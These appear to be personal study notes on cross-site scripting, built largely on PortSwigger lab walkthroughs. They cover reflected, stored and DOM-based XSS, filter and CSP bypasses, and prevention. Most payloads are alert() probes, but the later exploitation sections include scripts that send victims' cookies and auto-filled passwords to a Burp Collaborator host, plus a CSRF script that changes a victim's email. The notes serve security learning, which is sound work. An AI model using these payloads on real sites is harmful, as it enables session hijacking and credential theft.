## Definition
allows an attacker to:
compromise the interactions that users have with a vulnerable application

It allows to:
- circumvent the same origin policy
- which is designed to segregate different websites from each other
=>
Cross-site scripting vulnerabilities allow to:
- masquerade as a victim user
- to carry out any actions that the user is able to perform
- to access any of the user's data

## How XSS works
works by -->  manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser:
the attacker can -->  fully compromise their interaction with the application

## Test if form is vulnerable
`alert()`
`print()`
`prompt('hello')`

## Attack types
- <span style="color:rgb(153, 102, 255)">Reflected XSS</span>:
  where the malicious script comes from the current HTTP request.
- <span style="color:rgb(153, 102, 255)">Stored XSS</span>:
  where the malicious script comes from the website's database.
- <span style="color:rgb(153, 102, 255)">DOM-based XS</span><span style="color:rgb(153, 102, 255)">S</span>:
  where the vulnerability exists in client-side code rather than server-side code

## Reflected XSS
the <span style="color:#6666ff">script</span> that you're trying to inject -->  <span style="color:#6666ff">comes from the current HTTP req</span>
  =>
  - you send a request
  - you receive a response
  =>  the malicious script is included -->  in the response
  
  you can only target yourself unless:
  - the <span style="color:#6666ff">payload</span> is inside -->  the <span style="color:#6666ff">URI</span>
  - you <span style="color:#6666ff">entice</span> a user -->  to click on the link                        (enitce = attract)

### Find and test for reflected XSS vulnerabilities
- **Test every entry point:** 
	- test separately every entry point for data within the application's HTTP requests
- **Submit random alphanumeric values:** 
	- for each entry point, submit a unique random value 
	- and determine whether the value is reflected in the response 
	- the value should be designed to survive most input validation
	  =>
	  so needs to be fairly short and contain only alphanumeric charactersBut it needs to be long enough to make accidental matches within the response highly unlikely. A random alphanumeric value of around 8 characters is normally ideal. You can use Burp Intruder's [number payloads](https://portswigger.net/burp/documentation/desktop/tools/intruder/payloads/types#numbers) with randomly generated hex values to generate suitable random values. And you can use Burp Intruder's [grep payloads settings](https://portswigger.net/burp/documentation/desktop/tools/intruder/configure-attack/settings#grep-payloads) to automatically flag responses that contain the submitted value.
- **Determine the reflection context:** 
- for each location within the response where the random value is reflected, determine its context 
- this might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.
- **Test a candidate payload:** 
  Based on the context of the reflection, test an initial candidate XSS payload that will trigger JavaScript execution if it is reflected unmodified within the response. The easiest way to test payloads is to send the request to [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), modify the request to insert the candidate payload, issue the request, and then review the response to see if the payload worked. An efficient way to work is to leave the original random value in the request and place the candidate XSS payload before or after it. Then set the random value as the search term in Burp Repeater's response view. Burp will highlight each location where the search term appears, letting you quickly locate the reflection.
- **Test alternative payloads:** 
  If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads and techniques that might deliver a working XSS attack based on the context of the reflection and the type of input validation that is being performed. For more details, see [cross-site scripting contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
- **Test the attack in a browser:** 
  Finally, if you succeed in finding a payload that appears to work within Burp Repeater, transfer the attack to a real browser (by pasting the URL into the address bar, or by modifying the request in [Burp Proxy's intercept view](https://portswigger.net/burp/documentation/desktop/tools/proxy/intercept-messages), and see if the injected JavaScript is indeed executed. Often, it is best to execute some simple JavaScript like `alert(document.domain)` which will trigger a visible popup within the browser if the attack succeeds

### Reflected XSS with event handlers and `href` attributes blocked
This lab contains a [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability with some whitelisted tags, but all events and anchor `href` attributes are blocked
=>
#### Find allowed tags
- search something in the website using a random string
- capture it in burp and send it to Intruder
- clear the search field and add `<§§>`
  ![[Pasted image 20240909120828.png]]
- in the payload paste the list of the [html tag](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- start the attack and look at the tag that has status 200
=>
in this case is -->  `animate` =>  you can use `svg`
=>
in the search bar send:
`<svg><a><animate attributeName=href values=javascript:alert(1)/><text>x=20 y=20>Click Me</text></a>`

### Reflected XSS with event handlers and `href` attributes blocked
`<svg><animatetransform onbegin='alert(1)'>`

## Stored XSS
more powerful
-  <span style="color:#6666ff">payload</span> is stored in something like a -->   <span style="color:#6666ff">DB</span>
- payload can be <span style="color:#6666ff">retrieved</span> <span style="color:#6666ff">later</span>
    =>
    it allows to <span style="color:#6666ff">attack</span><span style="color:#6666ff"> other users</span>


## Check which tags and events are not blocked
If a website implements some protections against XSS
=>
some tags and events will be blocked

To test all possible tags and events:
- List with all tags, events and cheatsheet for XSS -->  [here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- capture the request to the input field that is vulnerable
- send it to Intruder
- set the search field has -->`<§§>`
  ![[Pasted image 20240906162929.png]]

- copy all the tags from the link before and paste them as payload
- start the attack and see which tags have 200 as Status Code
- example with tag `body` -->  the only valid tag that you can use is `body`
  =>
- change the search field as -->   `<body%20§§=1>`
- as payload copy and paste the events list
- check the status code again
- for example -->  `onresize` is allowed
  =>
- send the request to Repeater
- change the the search field to -->  `<body onresize=print()>`


## DOM-based XSS
Arise when:
JS:
- takes data from an attack controllable source (es URL)
- passes it to a sink that supports dynamic code execution (es `eval()` or `innerHTML`)
  
this enables attackers to:
execute malicious JS =>  which typically allows them to hijack other users' accounts

To deliver a DOM-based XSS attack:
you need to:
- place data into a source so that:
	- it is propagated to a sink 
	- causes execution of arbitrary JS

The most common source for DOM XSS:
is the URL -->   typically accessed with the `window.location` object. 
=>
An attacker can:
- construct a link to send a victim to a vulnerable page 
- with a payload in the query string 
- and fragment portions of the URL

In certain circumstances:
such as when targeting a 404 page or a website running PHP:
the payload can also be placed in the path

###  Testing DOM-based XSS
#### Testing HTML sinks
To test for DOM XSS in an HTML sink:
- place a random alphanumeric string into the source (such as `location.search`)
- use developer tools to inspect the HTML
- find where your string appears
	- In Chrome's developer tools:
	- you can use `Control+F`  to search the DOM for your string

For each location where your string appears within the DOM, you need to:
- identify the context
- Based on this context, you need to:
	- refine your input to see how it is processed
For example:
if your string appears within a double-quoted attribute 
=>
try to -->  inject double quotes in your string to see if you can break out of the attribute

#### Testing JavaScript execution sinks
little harder:
bc -->  your input doesn't necessarily appear anywhere within the DOM
        => you can't search for it
=>
you 'll need to use the JS debugger to determine whether and how your input is sent to a sink.

For each potential source, such as `location`:
you first need to -->  find cases within the page's JS code where 
                   the source is being referenced. 
                   In Chrome's developer tools, you can use `Control+Shift+F`
                   to search all the page's JS code for the source.

Once you've found where the source is being read:
- you can use the JS debugger to add a break point 
- follow how the source's value is used

When you find a sink that is being assigned data that originated from the source:
you can use the debugger to inspect the value by hovering over the variable to show its value before it is sent to the sink. 

Then, as with HTML sinks:
you need to refine your input to see if you can deliver a successful XSS attack

### Exploiting DOM XSS
A website is vulnerable to DOM-based cross-site scripting:
if there is an executable path via which data can propagate from source to sink. 

In practice:
- different sources and sinks have differing properties and behavior 
- that can affect exploitability, and determine what techniques are necessary

The `document.write` sink works with `script` elements
=> so you can use a simple payload, such as the one below:
`document.write('... <script>alert(document.domain)</script> ...');`

#### DOM XSS in `document.write` sink using source `location.search`
This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the search query tracking functionality. 
- It uses the JavaScript `document.write` function
	- which writes data out to the page. 
- The `document.write` function is called with data from `location.search`
	- which you can control using the website URL
=>
1. Enter a random alphanumeric string into the search box.
2. Right-click and inspect the element, and observe that your random string has been placed inside an `img src` attribute.![[Pasted image 20240909095905.png]]
3. Break out of the `img` attribute by searching for:
   `"><svg onload=alert(1)>`

#### DOM XSS in `document.write` sink using source `location.search` inside a select element
in some situations the content that is written to `document.write`:
includes some surrounding context -->  that you need to take account of in your exploit
For example, you might need to:
close some existing elements before using your JavaScript payload

This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the stock checker functionality
=>
- Add a `storeId` query parameter to the URL
- enter a random alphanumeric string as its value =>  `&storeId=test`
- notice that your random string is now listed as one of the options in the drop-down list
  =>
- Right-click and inspect the drop-down list to confirm that the value of your `storeId` parameter has been placed inside a select element
- `&storeId=</option></select><img src=0 onerror=alert(1)>`

#### DOM XSS in `innerHTML` sink using source `location.search`
The `innerHTML` sink:
- doesn't accept `script` elements on any modern browser
- nor will `svg onload` events fire

This means you will need to:
use alternative elements like -->  `img` or `iframe`
Event handlers such as `onload` and `onerror` can be used in conjunction with these elements.
For example:
`element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'`

LAB:
in the search bar:
`<img src=1 onerror=alert(1)>`

#### Sources and sinks in third-party dependencies
Modern web applications are typically built using a number of third-party libraries and frameworks
=>
often provide additional functions and capabilities for developers

##### DOM XSS in jQuery
jQuery's `attr()` function can change the attributes of DOM elements
=>
- If data is read from a user-controlled source like the URL
- then passed to the `attr()` function, 
- then it may be possible to manipulate the value sent to cause XSS

For example:
here we have some JS that changes an anchor element's `href` attribute using data from the URL:

```JavaScript
$(function() { 
	$('#backLink').attr("href", (newURLSearchParams(window.location.search)).get('returnUrl')); 
});
```


You can exploit this by:
- modifying the URL so that the `location.search` source contains a malicious JS URL

After the page's JS applies this malicious URL to the back link's `href`:
clicking on the back link will execute it:
`?returnUrl=javascript:alert(document.domain)`

###### DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the submit feedback page. 
- It uses the jQuery library's `$` selector function to find an anchor element
- and changes its `href` attribute using data from `location.search`.

=>
- On the Submit feedback page, change the query parameter `returnPath` to `/` followed by a random alphanumeric string.
- Right-click and inspect the element, and observe that your random string has been placed inside an a `href` attribute.
- Change `returnPath` to:
  `javascript:alert(document.cookie)`
- Hit enter and click "back"

###### DOM XSS in jQuery selector sink using a hashchange event
Another potential sink to look out for is jQuery's `$()` selector function:
which can be used to -->  inject malicious objects into the DOM.

jQuery used to be extremely popular, and a classic DOM XSS vulnerability was caused by websites using this selector in conjunction with the `location.hash` source for animations or auto-scrolling to a particular element on the page.
This behavior was often implemented using:
a vulnerable `hashchange` event handler, similar to the following:
```JavaScript
$(window).on('hashchange', function() { 
	var element = $(location.hash); 
	element[0].scrollIntoView(); 
});
```
As the `hash` is user controllable, an attacker could:
- use this to inject an XSS vector into the `$()` selector sink

More recent versions of jQuery -->  have patched this particular vulnerability 
                               by preventing you from injecting HTML into a selector when the input begins with a hash character (`#`). 
However, you may still find vulnerable code in the wild.

To actually exploit this classic vulnerability:
you'll need to find a way to trigger a `hashchange` event without user interaction. 
One of the simplest ways of doing this is to deliver your exploit via an `iframe`:
`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`
In this example:
- the `src` attribute points to the vulnerable page with an empty hash value
- when the `iframe` is loaded:
	- an XSS vector is appended to the hash
	- causing the `hashchange` event to fire

LAB:
- Notice the vulnerable code on the home page using Burp or the browser's DevTools.
- From the lab banner, open the exploit server.
- In the **Body** section, add the following malicious `iframe`:
    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`
- Store the exploit, then click **View exploit** to confirm that the `print()` function is called

##### DOM XSS in AngularJS
If a framework like [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection) is used:
- it may be possible to execute JavaScript without angle brackets or events

When a site uses the `ng-app` attribute on an HTML element:
it will be processed by AngularJS.
=>
AngularJS will execute JS inside double curly braces:
that can occur directly in HTML or inside attributes

###### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
1. Enter a random alphanumeric string into the search box.
2. View the page source and observe that your random string is enclosed in an `ng-app` directive.
3. Enter the following AngularJS expression in the search box:
    
    `{{$on.constructor('alert(1)')()}}`
4. Click **search**

## DOM XSS combined with reflected and stored data
websites often:
- reflect URL parameters in the HTML response from the server. 
- This is commonly associated with normal XSS
- but it can also lead to reflected DOM XSS vulnerabilities.
=>
In a reflected DOM XSS vulnerability:
- the server processes data from the request
- echoes the data into the response
- The reflected data might be placed into a JS string literal, 
- or a data item within the DOM, such as a form field
- A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink
`eval('var data = "reflected string"');`

### Reflected DOM XSS
`\"-alert(1)}//`
### Stored DOM XSS
This lab demonstrates a stored DOM vulnerability in the blog comment functionality
Post a comment containing the following vector:
`<><img src=1 onerror=alert(1)>`

## sinks can lead to DOM-XSS vulnerabilities
The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
`document.write() document.writeln() document.domain element.innerHTML element.outerHTML element.insertAdjacentHTML element.onevent`

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
`add() after() append() animate() insertAfter() insertBefore() before() html() prepend() replaceAll() replaceWith() wrap() wrapInner() wrapAll() has() constructor() init() index() jQuery.parseHTML() $.parseHTML()`


## Others
### XSS in HTML tag attributes
When the XSS context is into an HTML tag attribute value you might sometimes be able to:
- terminate the attribute value
- close the tag
- introduce a new one
=>
`"><script>alert(document.domain)</script>`

More commonly in this situation:
angle brackets are blocked or encoded
=>
your input cannot break out of the tag in which it appears
=>
you can:
- terminate the attribute value
- introduce a new attribute that creates a scriptable context, such as an event handler
=>
`" autofocus onfocus=alert(document.domain) x="`
The above payload:
- creates an `onfocus` event that will execute JS when the element receives the focus
- it also adds the `autofocus` attribute to try to trigger the `onfocus` event automatically without any user interaction
- it adds `x="` to gracefully repair the following markup

Sometimes the XSS context:
is into a type of HTML tag attribute -->  that itself can create a scriptable context. 
=>
you can execute JS without needing to terminate the attribute value. 
For example:
if the XSS context is into the `href` attribute of an anchor tag:
you can use the `javascript` pseudo-protocol to execute script. 
For example:
`<a href="javascript:alert(document.domain)">`

### XSS into JavaScript
#### Terminating the existing script
In the simplest case it is possible to:
- close the script tag that is enclosing the existing JavaScript
- introduce some new HTML tags that will trigger execution of JavaScript
example with this code:
```JavaScript
<script> 
	... 
	var input = 'controllable data here'; 
	... 
</script>

```
=>
you can use the following payload to break out of the existing JS and execute your own:
`</script><img src=1 onerror=alert(document.domain)>`

##### Reflected XSS into a JavaScript string with single quote and backslash escaped
1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript string.
3. Try sending the payload `test'payload` and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
4. Replace your input with the following payload to break out of the script block and inject a new script:
   `</script><script>alert(1)</script>`
5. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.

#### Breaking out of a JavaScript string
In cases where the XSS context is inside a quoted string literal:
it is often possible to -->  break out of the string and execute JavaScript directly. 

It is essential to:
repair the script following the XSS context
because -->  any syntax errors there will prevent the whole script from executing.

Some useful ways of breaking out of a string literal are:
`'-alert(document.domain)-' 
`';alert(document.domain)//`

##### Reflected XSS into a JavaScript string with angle brackets HTML encoded
1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript string.
3. Replace your input with the following payload to break out of the JavaScript string and inject an alert:
   `'-alert(1)-'`
4. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.

Some applications:
attempt to prevent input from breaking out of the JS string by escaping any single quote characters with a backslash. 
A backslash before a character:
- tells the JS parser that the character should be interpreted literally
- not as a special character such as a string terminator
In this situation: 
app often make the mistake of failing to escape the backslash character itself. 
=>
This means that an attacker:
can use their own backslash character to neutralize the backslash that is added by the application.

For example, suppose that the input:
`';alert(document.domain)//`
gets converted to:
`\';alert(document.domain)//`
You can now use the alternative payload:
`\';alert(document.domain)//`
which gets converted to:
`\\';alert(document.domain)//`

example:
1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript string.
3. Try sending the payload `test'payload` and observe that your single quote gets backslash-escaped, preventing you from breaking out of the string.
4. Try sending the payload `test\payload` and observe that your backslash doesn't get escaped.
5. Replace your input with the following payload to break out of the JavaScript string and inject an alert:
   `\'-alert(1)//`
6. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert

##### Reflected XSS in a JavaScript URL with some characters blocked
`https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27`
- The exploit uses exception handling to call the `alert` function with arguments. 
- The `throw` statement is used, separated with a blank comment in order to get round the no spaces restriction. 
- The `alert` function is assigned to the `onerror` exception handler.
=>
As `throw` is a statement, it cannot be used as an expression. 
Instead, we need to use arrow functions to create a block so that the `throw` statement can be used. 
We then need to call this function, so we assign it to the `toString` property of `window` and trigger this by forcing a string conversion on `window`.

### Making use of HTML-encoding
When the XSS context is some existing JS within a quoted tag attribute:
it is possible to make use of HTML-encoding to work around some input filters.

When the browser has parsed out the HTML tags and attributes within a response:
- it will perform HTML-decoding of tag attribute values before they are processed any further
- If the server-side application blocks or sanitizes certain characters that are needed for a successful XSS exploit
  =>
  you can often bypass the input validation by HTML-encoding those characters.

For example, if the XSS context is as follows:
`<a href="#" onclick="... var input='controllable data here'; ...">`

and the application blocks or escapes single quote characters
=>
you can use the following payload to break out of the JS string and execute your own script:
`&apos;-alert(document.domain)-&apos;`

The `&apos;` sequence:
is an HTML entity representing an apostrophe or single quote. 
Because the browser HTML-decodes the value of the `onclick` attribute before the JavaScript is interpreted
=>
the entities are decoded as quotes, which become string delimiters, and so the attack succeeds

#### Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
1. Post a comment with a random alphanumeric string in the "Website" input, then use Burp Suite to intercept the request and send it to Burp Repeater.
2. Make a second request in the browser to view the post and use Burp Suite to intercept the request and send it to Burp Repeater.
3. Observe that the random string in the second Repeater tab has been reflected inside an `onclick` event handler attribute.
4. Repeat the process again but this time modify your input to inject a JavaScript URL that calls `alert`, using the following payload:
   `http://foo?&apos;-alert(1)-&apos;`
5. Verify the technique worked by right-clicking, selecting "Copy URL", and pasting the URL in the browser. Clicking the name above your comment should trigger an alert

### XSS in JavaScript template literals
JS template literals are string literals that allow embedded JS expressions. 
The embedded expressions:
- are evaluated 
- and are normally concatenated into the surrounding text

Template literals:
- are encapsulated in backticks instead of normal quotation marks,
- and embedded expressions are identified using the `${...}` syntax.

For example, the following script will print a welcome message that includes the user's display name:
``document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;``

When the XSS context is into a JS template literal:
- there is no need to terminate the literal
- instead, you simply need to use the `${...}` syntax to embed a JS expression that will be executed when the literal is processed
=>
For example, if the XSS context is as follows:
``<script> ... var input = `controllable data here`; ... </script>``

then you can use the following payload to execute JS without terminating the template literal:
`${alert(document.domain)}`

#### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
1. Submit a random alphanumeric string in the search box, then use Burp Suite to intercept the search request and send it to Burp Repeater.
2. Observe that the random string has been reflected inside a JavaScript template string.
3. Replace your input with the following payload to execute JavaScript inside the template string: 
   `${alert(1)}`
4. Verify the technique worked by right clicking, selecting "Copy URL", and pasting the URL in the browser. When you load the page it should trigger an alert.

### Exploiting XSS to steal cookies
This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
    
    `<script> fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>`
    
    This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.
    
4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
5. Take a note of the value of the victim's cookie in the POST body.
6. Reload the main blog page, using Burp Proxy or Burp Repeater to replace your own session cookie with the one you captured in Burp Collaborator. Send the request to solve the lab. To prove that you have successfully hijacked the admin user's session, you can use the same cookie in a request to `/my-account` to load the admin user's account page.

### Exploiting XSS to capture passwords
These days, many users have:
password managers that auto-fill their passwords.
=>
You can take advantage of this by:
- creating a password input
- reading out the auto-filled password
- sending it to your own domain
=>
1. Using [Burp Suite Professional](https://portswigger.net/burp/pro), go to the [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) tab.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
3. Submit the following payload in a blog comment, inserting your Burp Collaborator subdomain where indicated:
   
```JavaScript
<input name=username id=username> 
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', 
mode: 'no-cors',
body:username.value+':'+this.value 
});">
```

   This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.
4. Go back to the Collaborator tab, and click "Poll now". You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again.
5. Take a note of the value of the victim's username and password in the POST body.
6. Use the credentials to log in as the victim user


### Exploiting XSS to perform CSRF
Some websites allow logged-in users to change their email address without re-entering their password. 
If you've found an XSS vulnerability
=>
- you can make it trigger this functionality to change the victim's email address to one that you control
- then trigger a password reset to gain access to the account.

This type of exploit is typically referred to as [cross-site request forgery](https://portswigger.net/web-security/csrf) ([CSRF](https://portswigger.net/web-security/csrf)):
which is slightly confusing because CSRF can also occur as a standalone vulnerability. When CSRF occurs as a standalone vulnerability:
it can be patched using strategies like anti-CSRF tokens

=>
- Log in using the credentials provided. On your user account page, notice the function for updating your email address.
- If you view the source for the page, you'll see the following information:
    - You need to issue a POST request to `/my-account/change-email`, with a parameter called `email`.
    - There's an anti-CSRF token in a hidden input called `token`.This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.
- Submit the following payload in a blog comment:
  
```JavaScript
<script> 
	var req = new XMLHttpRequest(); 
	req.onload = handleResponse; 
	req.open('get','/my-account',true); 
	req.send(); 
	function handleResponse() { 
		var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
		var changeReq = new XMLHttpRequest(); 
		changeReq.open('post', '/my-account/change-email', true); 
		changeReq.send('csrf='+token+'&email=test@test.com') }; 
</script>
```
  This will make anyone who views the comment issue a POST request to change their email address to `test@test.com`

### Content security policy
CSP -->  browser security mechanism that aims to mitigate XSS and some other attacks
it works by:
- restricting the resources (such as scripts and images) that a page can load 
- restricting whether a page can be framed by other pages

To enable CS: 
- a response needs to include an HTTP response header called `Content-Security-Policy`
- with a value containing the policy
- The policy itself consists of one or more directives, separated by semicolons

#### Mitigating XSS attacks using CSP
The following directive will only allow scripts to be loaded from the [same origin](https://portswigger.net/web-security/cors/same-origin-policy) as the page itself:
`script-src 'self'`
The following directive will only allow scripts to be loaded from a specific domain:
`script-src https://scripts.normal-website.com`

##### Reflected XSS protected by CSP, with CSP bypass
1. Enter the following into the search box:
   `<img src=1 onerror=alert(1)>`
2. Observe that the payload is reflected, but the CSP prevents the script from executing.
3. In Burp Proxy, observe that the response contains a `Content-Security-Policy` header, and the `report-uri` directive contains a parameter called `token`. 
   Because you can control the `token` parameter, you can inject your own CSP directives into the policy.
4. Visit the following URL, replacing `YOUR-LAB-ID` with your lab ID:
   `https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27`

The injection uses the `script-src-elem` directive in CSP. 
This directive allows you to target just `script` elements. 
Using this directive, you can overwrite existing `script-src` rules enabling you to inject `unsafe-inline`, which allows you to use inline scripts


## Prevent XSS
2 steps:
- Encode data on output
- Validate input on arrival

### Encode data on output
Encoding should be applied:
- directly before user-controllable data is written to a page
- because:
  the context you're writing into determines what kind of encoding you need to use

For example:
values inside a JS string require a different type of escaping to those in an HTML context.

In an HTML context, you should convert non-whitelisted values into HTML entities:
- `<` converts to: `&lt;`
- `>` converts to: `&gt;`

In a JavaScript string context, non-alphanumeric values should be Unicode-escaped:
- `<` converts to: `\u003c`
- `>` converts to: `\u003e`

### Validate input on arrival
Encoding is probably the most important line of XSS defense
Examples of input validation include:
- If a user submits a URL that will be returned in responses, validating that it starts with a safe protocol such as HTTP and HTTPS. Otherwise someone might exploit your site with a harmful protocol like `javascript` or `data`.
- If a user supplies a value that it expected to be numeric, validating that the value actually contains an integer.
- Validating that input contains only an expected set of characters.

Input validation should ideally work by blocking invalid input. 
An alternative approach:
attempting to clean invalid input to make it valid -->  is more error prone and 
                                            should be avoided wherever possible